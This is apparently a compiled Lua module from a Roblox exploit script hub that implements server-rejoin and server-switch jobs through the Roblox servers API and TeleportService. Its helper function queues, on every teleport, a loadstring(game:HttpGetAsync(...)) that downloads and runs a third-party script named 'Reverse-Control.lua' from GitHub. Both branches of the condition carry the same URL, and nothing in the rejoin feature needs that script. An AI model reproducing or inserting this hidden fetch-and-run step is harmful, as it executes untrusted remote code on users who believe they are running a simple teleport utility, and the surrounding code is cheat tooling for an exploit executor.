local a = require(script.Parent.Parent.include.RuntimeLib)
local ey = a.import(script, a.getModule(script, "@rbxts", "services"))
local ia = ey.HttpService
local dV = ey.Players
local ib = ey.TeleportService
local f6 = a.import(script, script.Parent, "helpers", "job-store")
local em = f6.getStore
local eA = f6.onJobChange
local aS = a.import(script, script.Parent.Parent, "store", "actions", "jobs.action").setJobActive
local ic = a.import(script, script.Parent.Parent, "utils", "http")
local cX = a.import(script, script.Parent.Parent, "utils", "timeout").setTimeout
local id
local ie = a.async(function()
	id()
	local ig = ia:JSONDecode(
		a.await(
			ic.get(
				"https://games.roblox.com/v1/games/"
					.. tostring(game.PlaceId)
					.. "/servers/Public?sortOrder=Asc&limit=100"
			)
		)
	)
	local ih = ig.data
	local y = function(ii)
		return ii.playing < ii.maxPlayers and ii.id ~= game.JobId
	end
	local e1 = {}
	local H = 0
	for J, K in ipairs(ih) do
		if y(K, J - 1, ih) == true then
			H = H + 1
			e1[H] = K
		end
	end
	local ij = e1
	if #ij == 0 then
		error("[server-worker-switch] No servers available.")
	else
		local ii = ij[math.random(#ij - 1) + 1]
		ib:TeleportToPlaceInstance(game.PlaceId, ii.id)
	end
end)
local ik = a.async(function()
	id()
	if #dV:GetPlayers() == 1 then
		ib:Teleport(game.PlaceId, dV.LocalPlayer)
	else
		ib:TeleportToPlaceInstance(game.PlaceId, game.JobId)
	end
end)
function id()
	local il = { string.match(VERSION, "^.+%..+%..+$") } ~= nil
	local f4 = il
			and 'loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Errs404/Reverse-roblox-script/refs/heads/main/Reverse-Control.lua"))()'
		or 'loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Errs404/Reverse-roblox-script/refs/heads/main/Reverse-Control.lua"))()'
	local b3 = syn
	if b3 ~= nil then
		b3 = b3.queue_on_teleport
	end
	local b5 = b3
	if b5 == nil then
		b5 = queue_on_teleport
	end
	local b4 = b5
	if b4 ~= nil then
		b4(f4)
	end
end
local et = a.async(function()
	local eu = a.await(em())
	local ew
	local function cW()
		local b3 = ew
		if b3 ~= nil then
			b3:clear()
		end
		ew = nil
	end
	a.await(eA("rejoinServer", function(eM, F)
		cW()
		if F.jobs.switchServer.active then
			aS("switchServer", false)
		end
		if eM.active then
			ew = cX(function()
				ik():catch(function(dw)
					warn("[server-worker-rejoin] " .. tostring(dw))
					eu:dispatch(aS("rejoinServer", false))
				end)
			end, 1000)
		end
	end))
	a.await(eA("switchServer", function(eM, F)
		cW()
		if F.jobs.rejoinServer.active then
			aS("rejoinServer", false)
		end
		if eM.active then
			ew = cX(function()
				ie():catch(function(dw)
					warn("[server-worker-switch] " .. tostring(dw))
					eu:dispatch(aS("switchServer", false))
				end)
			end, 1000)
		end
	end))
end)
et():catch(function(dw)
	warn("[server-worker] " .. tostring(dw))
end)
